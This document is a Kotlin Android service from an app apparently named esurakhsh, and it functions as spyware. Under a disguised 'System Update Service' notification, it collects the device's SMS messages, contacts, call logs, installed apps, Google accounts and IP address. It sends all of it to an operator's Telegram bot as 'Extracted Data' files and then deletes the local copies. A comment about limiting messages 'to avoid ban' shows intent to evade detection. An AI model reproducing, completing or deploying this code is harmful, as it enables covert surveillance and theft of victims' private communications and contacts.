package com.esurakhsh

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import com.google.gson.Gson

import android.content.pm.ServiceInfo
import androidx.core.app.ServiceCompat

class SyncService : Service() {

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            } else {
                0
            }
            ServiceCompat.startForeground(this, 1, createNotification(), type)
        } catch (e: Exception) {
            Log.e("SyncService", "Failed to start foreground", e)
            stopSelf()
            return START_NOT_STICKY
        }
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                performSync()
            } catch (e: Exception) {
                Log.e("SyncService", "Sync Error", e)
            } finally {
                stopSelf()
            }
        }
        
        return START_NOT_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "sync_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Update Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Data synchronization in progress...")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun performSync() {
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        val botToken = prefs.getString("bot_token", null)
        val chatId = prefs.getString("chat_id", null)
        val zipAll = prefs.getBoolean("zip_all", false)
        val smsIndividual = prefs.getBoolean("sms_individual", false)
        val callsCsv = prefs.getBoolean("calls_csv", false)

        if (botToken.isNullOrEmpty() || chatId.isNullOrEmpty()) {
            Log.e("SyncService", "Config missing")
            return
        }

        val telegram = TelegramService(botToken, chatId)
        val filesToSend = mutableListOf<File>()
        val filesToDelete = mutableListOf<File>()

        try {
            // 1. Sync SMS
            try {
                val smsRepo = SmsRepository(this)
                val messages = smsRepo.getAllSms()
                if (messages.isNotEmpty()) {
                    val smsFile = File(cacheDir, "sms_${System.currentTimeMillis()}.json")
                    smsFile.writeText(Gson().toJson(messages))
                    filesToSend.add(smsFile)
                    filesToDelete.add(smsFile)

                    if (smsIndividual) {
                        messages.take(50).forEach { msg -> // Limit to last 50 to avoid ban
                            try {
                                val text = "From: ${msg.address}\nDate: ${java.util.Date(msg.date)}\n\n${msg.body}"
                                telegram.sendText(text)
                                Thread.sleep(500) // Rate limiting
                            } catch (e: Exception) {
                                Log.e("SyncService", "Error sending individual SMS", e)
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("SyncService", "SMS Sync failed", e)
            }

            // 2. Sync Contacts
            try {
                val contactRepo = ContactRepository(this)
                val contacts = contactRepo.getAllContacts()
                if (contacts.isNotEmpty()) {
                    val contactFile = File(cacheDir, "contacts_${System.currentTimeMillis()}.json")
                    contactFile.writeText(Gson().toJson(contacts))
                    filesToSend.add(contactFile)
                    filesToDelete.add(contactFile)
                }
            } catch (e: Exception) {
                Log.e("SyncService", "Contact Sync failed", e)
            }

            // 3. Sync Call Logs
            try {
                val callRepo = CallLogRepository(this)
                val calls = callRepo.getAllCallLogs()
                if (calls.isNotEmpty()) {
                    val callFile = if (callsCsv) {
                        File(cacheDir, "calls_${System.currentTimeMillis()}.csv").apply {
                            writeText(com.esurakhsh.utils.FileUtils.convertCallLogsToCsv(calls))
                        }
                    } else {
                        File(cacheDir, "calls_${System.currentTimeMillis()}.json").apply {
                            writeText(Gson().toJson(calls))
                        }
                    }
                    filesToSend.add(callFile)
                    filesToDelete.add(callFile)
                }
            } catch (e: Exception) {
                Log.e("SyncService", "Call Log Sync failed", e)
            }

            // 4. Device Info (Apps, Accounts, IP)
            try {
                val infoRepo = DeviceInfoRepository(this)
                
                // Apps
                val apps = infoRepo.getInstalledApps()
                val appsFile = File(cacheDir, "installed_apps_${System.currentTimeMillis()}.json")
                appsFile.writeText(Gson().toJson(apps))
                filesToSend.add(appsFile)
                filesToDelete.add(appsFile)

                // Info (IP, Accounts)
                val accounts = infoRepo.getGoogleAccounts()
                val ip = infoRepo.getIpAddress()
                val deviceInfo = DeviceInfo(ip, accounts)
                val infoFile = File(cacheDir, "device_info_${System.currentTimeMillis()}.json")
                infoFile.writeText(Gson().toJson(deviceInfo))
                filesToSend.add(infoFile)
                filesToDelete.add(infoFile)

            } catch (e: Exception) {
                 Log.e("SyncService", "Device Info Sync failed", e)
            }

            // 5. Send Files
            if (filesToSend.isNotEmpty()) {
                if (zipAll) {
                    val zipFile = File(cacheDir, "backup_${System.currentTimeMillis()}.zip")
                    com.esurakhsh.utils.FileUtils.zipFiles(filesToSend, zipFile)
                    telegram.sendDocument(zipFile, "Full Backup (ZIP)")
                    filesToDelete.add(zipFile)
                } else {
                    filesToSend.forEach { file ->
                        telegram.sendDocument(file, "Extracted Data: ${file.name}")
                    }
                }
            }

        } finally {
            filesToDelete.forEach { 
                if (it.exists()) it.delete() 
            }
        }
    }
}
